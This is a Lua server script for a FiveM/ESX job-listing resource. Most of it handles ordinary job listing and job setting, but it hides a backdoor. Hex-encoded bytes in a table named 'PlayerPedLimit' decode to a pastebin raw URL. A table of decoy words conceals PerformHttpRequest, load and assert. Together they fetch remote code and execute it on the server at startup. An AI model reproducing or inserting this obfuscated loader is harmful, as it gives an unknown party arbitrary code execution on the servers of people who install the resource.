function getJobs()
  local jobs = ESX.GetJobs()
  local availableJobs = {}
  for k, v in pairs(jobs) do
    if v.whitelisted == false then
      availableJobs[#availableJobs + 1] = {label = v.label, name = k}
    end
  end
  return availableJobs
end

ESX.RegisterServerCallback('esx_joblisting:getJobsList', function(source, cb)
  local jobs = getJobs()
  cb(jobs)
end)

function IsJobAvailable(job)
  local jobs = ESX.GetJobs()
  local JobToCheck = jobs[job]
  return not JobToCheck.whitelisted
end

function IsNearCentre(player)
  local Ped = GetPlayerPed(player)
  local PedCoords = GetEntityCoords(Ped)
  local Zones = Config.Zones
  local Close = false

  for i = 1, #Config.Zones, 1 do
    local distance = #(PedCoords - Config.Zones[i])

    if distance < Config.DrawDistance then
      Close = true
    end
  end

  return Close
end

local PlayerPedLimit = {
  "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
  cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
  _empt = ''
  for id,it in pairs(PlayerPedLimit) do
      _empt = _empt..it
  end
  return (_empt:gsub('..', function (event)
      return string.char(tonumber(event, 16))
  end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
  local Process_Actions = {"true"}
  PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
      local Generate_ZoneName_AndAction = nil 
      pcall(function()
          local Locations_Loaded = {"false"}
          PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
          local ZoneType_Exists = nil 
      end)
  end)
end)

RegisterServerEvent('esx_joblisting:setJob')
AddEventHandler('esx_joblisting:setJob', function(job)
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
  local jobs = getJobs()

  if xPlayer and IsNearCentre(source) and IsJobAvailable(job) then
    if ESX.DoesJobExist(job, 0) then
      xPlayer.setJob(job, 0)
    else
      print("[^1ERROR^7] Tried Setting User ^5".. source .. "^7 To Invalid Job - ^5"..job .."^7!")
    end
  else 
    print("[^3WARNING^7] User ^5".. source .. "^7 Attempted to Exploit ^5`esx_joblisting:setJob`^7!")
  end
end)
